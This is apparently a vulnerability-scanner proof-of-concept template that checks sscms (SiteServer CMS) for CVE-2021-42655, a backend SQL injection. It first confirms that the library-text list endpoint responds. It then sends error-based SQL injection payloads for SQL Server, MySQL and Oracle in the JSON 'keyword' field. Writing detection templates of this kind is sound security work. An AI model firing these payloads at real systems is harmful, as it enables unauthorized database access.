name: poc-yaml-sscms-cve-2021-42655-sqli
binding: 454966d5-479a-4d8f-8158-c349c272bae2
manual: true
detail:
    author: secking
    links:
        - https://github.com/siteserver/cms/issues/3237
        - https://cxsecurity.com/cveshow/CVE-2021-42655/
    vulnerability:
        id: CT-427417
        level: high
    description: sscms cve-2021-42655-sqli 后台注入
transport: http
set:
    num: randomLowercase(5)
    md5num: md5(num)
    subst: substr(md5num, 4, 28)
rules:
    r0:
        request:
            cache: false
            method: POST
            path: /api/pages/cms/libraryText/list
            headers:
                Content-Type: application/json
            body: |
                {"siteId":1,"keyword":"1","groupId":0,"page":1,"perPage":24}
        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("libraryType")) && response.body.bcontains(bytes("groupName"))
    sqlserver:
        request:
            cache: false
            method: POST
            path: /api/pages/cms/libraryText/list
            headers:
                Content-Type: application/json
            body: |
                {"siteId":1,"keyword":"' and 1=(RIGHT(sys.fn_VarBinToHexStr(hashbytes('MD5','{{num}}')),32))--","groupId":0,"page":1,"perPage":24}
        expression: response.status == 500 && response.body.bcontains(bytes(md5num))
    mysql:
        request:
            cache: false
            method: POST
            path: /api/pages/cms/libraryText/list
            headers:
                Content-Type: application/json
            body: |
                {"siteId":1,"keyword":"' and extractvalue(1,concat(0,md5('{{num}}')))-- ","groupId":0,"page":1,"perPage":24}
        expression: response.status == 500 && response.body.bcontains(bytes(subst))
    oracle:
        request:
            cache: false
            method: POST
            path: /api/pages/cms/libraryText/list
            headers:
                Content-Type: application/json
            body: |
                {"siteId":1,"keyword":"'AND 2572=UTL_INADDR.GET_HOST_ADDRESS((select standard_hash('{{num}}', 'MD5') from dual))-- ","groupId":0,"page":1,"perPage":24}
        expression: response.status == 500 && response.body.ibcontains(bytes(md5num))
expression: r0() && (sqlserver() || mysql() || oracle())
